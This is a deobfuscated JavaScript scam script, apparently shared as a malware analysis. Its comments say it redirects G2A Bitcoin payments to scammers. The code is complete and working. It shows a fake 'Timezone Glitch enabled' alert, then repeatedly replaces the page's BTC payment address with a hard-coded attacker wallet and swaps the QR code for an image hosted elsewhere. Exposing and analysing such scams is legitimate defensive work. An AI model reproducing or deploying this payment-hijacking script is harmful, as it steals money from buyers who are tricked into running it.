// Deobfuscated by Ondry4K
// Note: XPathResult.FIRST_ORDERED_NODE_TYPE is something to do with how G2A handles orders and isnt obfuscated. (probably used to determine if you are buying with bitcoin)
// TLDR to what this code does: It injects and changes the QR and BTC address so you send the money to the scammers instead of G2A.

alert('Timezone Glitch enabled! Press OK to continue. ')
;(function () {
  'use strict'
  var qrCode = 'https://i.ibb.co/Tw8cbVy/G2-AQRCODE-BTC.png'
  main()
  function main() {
    setTimeout(function () {
      injection()
    }, 2000)
    setTimeout(function () {
      enableFakeTimeGlitch() // or also can be defined as "2nd phase"
    }, 2000)
  }
  function injection() {
    let btcAddress = document.evaluate(
      '//span[contains(text(),"BTC address:")]/following-sibling::span',
      document,
      null,
      XPathResult.FIRST_ORDERED_NODE_TYPE,
      null
    ).singleNodeValue
    let qrCodeInjection = document.evaluate(
      '//img[@alt="QR code to scan"]',
      document,
      null,
      XPathResult.FIRST_ORDERED_NODE_TYPE,
      null
    ).singleNodeValue
    if (btcAddress !== null) {
      btcAddress.innerHTML = 'bc1qfzlwadqrzp730xycn08lnwsqct0ws8aylddvku'
      qrCodeInjection.src = qrCode
    }
    setTimeout(function () {
      injection()
    }, 100)
  }
  function enableFakeTimeGlitch() {
    let continueButton = document.evaluate(
      '//button[contains(text(),"Continue")]',
      document,
      null,
      XPathResult.FIRST_ORDERED_NODE_TYPE,
      null
    ).singleNodeValue
    if (continueButton !== null) {
      continueButton.addEventListener('click', function () {
        const currentDate = new Date()
        let lastScriptUpdate =
          'Timezone Glitch enabled! Press OK to continue. Last script update: ' +
          currentDate.getFullYear() +
          '-' +
          (currentDate.getMonth() + 1) +
          '-' +
          currentDate.getDate()
        alert(lastScriptUpdate)
      })
    } else {
      setTimeout(function () {
        enableFakeTimeGlitch()
      }, 100)
    }
  }
})()
//FhttFF // executor, we can get rid of this (its not useful for now, because we arent running the script)